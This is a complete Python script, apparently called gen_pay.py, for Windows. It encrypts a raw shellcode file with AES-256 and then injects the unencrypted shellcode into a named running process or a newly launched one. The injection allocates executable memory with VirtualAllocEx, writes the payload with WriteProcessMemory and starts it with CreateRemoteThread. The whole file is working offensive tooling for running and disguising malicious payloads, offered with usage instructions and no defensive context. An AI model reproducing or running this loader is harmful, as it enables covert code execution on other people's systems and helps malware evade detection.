import sys
import os
import hashlib
import subprocess
import csv
from io import StringIO
import ctypes
from ctypes import wintypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x00000004

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

def get_max_pid(process_name):
    cmd = ['tasklist', '/fi', f'imagename eq {process_name}', '/v', '/fo', 'csv']
    output = subprocess.check_output(cmd).decode('utf-8', errors='ignore')
    f = StringIO(output)
    reader = csv.DictReader(f)
    pids = [int(row['PID']) for row in reader if row['PID'].isdigit()]
    if not pids:
        raise Exception(f"No running process found with name: {process_name}")
    return max(pids)

def inject_shellcode(pid, shellcode):
    size = len(shellcode)
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise Exception("Failed to open process")
    
    alloc_addr = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not alloc_addr:
        raise Exception("Failed to allocate memory")
    
    written = ctypes.c_size_t(0)
    ctypes.windll.kernel32.WriteProcessMemory(h_process, alloc_addr, shellcode, size, ctypes.byref(written))
    
    thread_id = wintypes.DWORD()
    h_thread = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, alloc_addr, None, 0, ctypes.byref(thread_id))
    if not h_thread:
        raise Exception("Failed to create remote thread")
    
    # Optional: Wait for thread to finish
    # ctypes.windll.kernel32.WaitForSingleObject(h_thread, -1)
    
    print(f"Injected shellcode into PID {pid}")

def main():
    if len(sys.argv) != 6:
        print("Usage:")
        print("  python gen_pay.py 0 <process_name> <shellcode.bin> <key_to_encrypt> <outputfile.bin>")
        print("  python gen_pay.py 1 <process_path> <shellcode.bin> <key_to_encrypt> <outputfile.bin>")
        sys.exit(1)
    
    mode = int(sys.argv[1])
    arg2 = sys.argv[2]  # process_name or process_path
    shellcode_path = sys.argv[3]
    key_str = sys.argv[4]
    output_path = sys.argv[5]
    
    # Read plain shellcode
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()
    
    # Derive 256-bit key
    key = hashlib.sha256(key_str.encode('utf-8')).digest()
    
    # Encrypt with AES-256-CBC and PKCS7 padding
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_shellcode = pad(shellcode, AES.block_size)
    encrypted = iv + cipher.encrypt(padded_shellcode)
    
    # Write to output file
    with open(output_path, 'wb') as f:
        f.write(encrypted)
    print(f"Encrypted payload written to {output_path}")
    
    # Perform injection with plain shellcode
    if mode == 0:
        pid = get_max_pid(arg2)
        inject_shellcode(pid, shellcode)
    elif mode == 1:
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()
        created = ctypes.windll.kernel32.CreateProcessA(arg2.encode('utf-8'), None, None, None, False, 0, None, None, ctypes.byref(si), ctypes.byref(pi))
        if not created:
            raise Exception("Failed to create process")
        inject_shellcode(pi.dwProcessId, shellcode)
        # Optional: Resume main thread if suspended
        # ctypes.windll.kernel32.ResumeThread(pi.hThread)
    else:
        raise Exception("Invalid mode")

if __name__ == "__main__":
    main()
